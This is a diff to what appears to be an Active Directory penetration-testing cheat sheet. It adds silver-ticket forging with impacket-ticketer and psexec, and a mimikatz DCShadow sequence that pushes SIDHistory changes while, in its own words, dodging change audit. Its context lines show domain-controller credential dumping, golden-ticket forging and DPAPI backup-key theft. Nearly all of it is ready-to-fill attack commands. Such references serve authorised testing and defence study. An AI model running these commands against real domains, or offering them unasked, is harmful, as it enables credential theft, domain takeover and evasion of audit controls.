@@ -220,6 +220,12 @@ impacket-secretsdump -just-dc <domain>/Administrator:<password>@<ip_address>
 impacket-ticketer -nthash <NThash> -domain-sid <domain-sid> -domain <domain> Administrator
 KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass <domain>/Administrator@<hostname>
 # companion:end golden-ticket
+
+# Silver Ticket — service/machine acct hash -> forge a TGS for ONE service offline (no DC, no DA):
+# companion:gen silver-ticket
+impacket-ticketer -nthash <NThash> -domain-sid <domain-sid> -domain <domain> -spn cifs/<hostname> Administrator
+KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass <domain>/Administrator@<hostname>
+# companion:end silver-ticket
 ////////////////////////////////////////
 
 
@@ -337,6 +343,12 @@ impacket-dpapi backupkeys -t <domain>/<user>:<password>@<ip_address> --export
 impacket-dpapi masterkey -file <masterkey-file> -pvk key.pvk
 impacket-dpapi credential -file <credential-blob> -key <decrypted-masterkey>
 # companion:end dpapi-backupkey
+
+# DCShadow — register a rogue DC and PUSH directory changes as replication (dodges change audit):
+# companion:gen dcshadow
+mimikatz # lsadump::dcshadow /object:<user> /attribute:SIDHistory /value:<attacker-sid>
+mimikatz # lsadump::dcshadow /push
+# companion:end dcshadow
 ////////////////////////////////////////
 
 
